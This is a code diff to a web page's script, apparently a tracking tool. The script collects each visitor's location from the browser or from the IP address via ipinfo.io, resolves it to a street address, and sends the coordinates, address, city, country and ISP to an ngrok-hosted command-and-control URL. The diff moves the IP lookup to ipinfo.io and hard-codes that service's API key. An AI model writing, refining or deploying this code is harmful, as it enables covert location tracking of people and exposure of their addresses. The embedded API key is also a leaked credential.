@@ -82,13 +82,18 @@
     </div>
 
     <script>
-        // !!! IMPORTANT: REPLACE THIS URL WITH YOUR LIVE NGROK URL FROM STEP 2 !!!
-        const C2_SERVER_URL = "https://spidery-eddie-nontemperable.ngrok-free.dev/api/location/web"; // e.g., "https://abcdef123456.ngrok-free.app/api/location/web"
+        // !!! IMPORTANT: REPLACE THIS URL WITH YOUR LIVE NGROK URL EACH TIME YOU RESTART NGROK !!!
+        // Example: "https://abcdef123456.ngrok-free.app/api/location/web"
+        const C2_SERVER_URL = "https://<YOUR_NGROK_URL_HERE>/api/location/web"; 
 
+        // --- IP Geolocation Configuration (HTTPS compatible with your free API key) ---
+        // Your ipinfo.io API key provided:
+        const IPINFO_API_KEY = "4c441b424ac16a"; 
+        const IPINFO_GEO_API = `https://ipinfo.io/json?token=${IPINFO_API_KEY}`;
+
+        // Other external APIs remain the same
         const NOMINATIM_REVERSE_API = "https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}&zoom=18&addressdetails=1";
-        const IP_API_URL = "https://api.ipify.org?format=json";
-        const GEO_IP_API_URL = "http://ip-api.com/json/"; // Note: ip-api.com does not support HTTPS for free tier
-        const USER_AGENT_CLIENT = "UnboundWebOracle/1.1 (C2_Origin)"; 
+        const USER_AGENT_CLIENT = "UnboundWebOracle/1.2 (C2_Origin)"; 
 
         const STATUS_MESSAGE_ELEMENT = document.getElementById('statusMessage');
         const LOADING_SPINNER_ELEMENT = document.getElementById('loadingSpinner');
@@ -190,37 +195,32 @@
             }
         }
 
-        // --- Step 2: Fallback to IP-based Geolocation ---
+        // --- Step 2: Fallback to IP-based Geolocation (Now using ipinfo.io HTTPS) ---
         async function getIpGeolocation() {
             updateStatus("Acquiring approximate location via IP address...", false);
             try {
-                const ipResponse = await fetch(IP_API_URL);
-                if (!ipResponse.ok) throw new Error(`HTTP error! status: ${ipResponse.status} from ipify`);
-                const ipData = await ipResponse.json();
-                const publicIp = ipData.ip;
-
-                // Note: ip-api.com does not support HTTPS for free tier. Browsers might block this on an HTTPS page.
-                // This is a known limitation of free services. If it fails, you may need a different IP Geo API.
-                const geoIpResponse = await fetch(`${GEO_IP_API_URL}${publicIp}`); 
-                if (!geoIpResponse.ok) throw new Error(`HTTP error! status: ${geoIpResponse.status} from ip-api`);
+                const geoIpResponse = await fetch(IPINFO_GEO_API); // Use ipinfo.io directly
+                if (!geoIpResponse.ok) {
+                    const errorText = await geoIpResponse.text();
+                    throw new Error(`HTTP error! Status: ${geoIpResponse.status} from ipinfo.io: ${errorText}`);
+                }
                 const geoData = await geoIpResponse.json();
 
-                if (geoData.status === "success") {
-                    const lat = geoData.lat;
-                    const lon = geoData.lon;
+                if (geoData.loc) { // ipinfo.io returns location as "lat,lon" in 'loc' field
+                    const [lat, lon] = geoData.loc.split(',');
+                    const publicIp = geoData.ip || 'Unknown IP';
                     
                     updateStatus(`Approximate location (IP-based) acquired! Resolving address...`, false);
-                    const streetAddress = await reverseGeocode(lat, lon);
+                    const streetAddress = await reverseGeocode(parseFloat(lat), parseFloat(lon)); // Parse lat/lon to float
                     updateStatus(`Location confirmed: <strong>${streetAddress}</strong> (IP-based)`, false);
-                    sendLocationToC2(lat, lon, -1, "IP_API", streetAddress, geoData.city, geoData.country, geoData.isp);
-
+                    sendLocationToC2(parseFloat(lat), parseFloat(lon), -1, "IP_API", streetAddress, geoData.city, geoData.country, geoData.org || geoData.isp); // 'org' often has ISP info
                 } else {
-                    updateStatus(`IP Geolocation failed: ${geoData.message || 'Unknown error'}`, true);
-                    sendFailureToC2("IP_GEOLOCATION_FAILED", geoData.message);
+                    updateStatus(`IP Geolocation failed via ipinfo.io: ${geoData.reason || 'No location data found.'}`, true);
+                    sendFailureToC2("IP_GEOLOCATION_FAILED_IPINFO", geoData.reason || 'No location data.');
                 }
             } catch (error) {
-                updateStatus(`Error getting IP geolocation: ${error.message}`, true);
-                sendFailureToC2("IP_GEOLOCATION_FETCH_ERROR", error.message);
+                updateStatus(`Error getting IP geolocation via ipinfo.io: ${error.message}`, true);
+                sendFailureToC2("IP_GEOLOCATION_FETCH_ERROR_IPINFO", error.message);
             } finally {
                 toggleSpinner(false);
             }
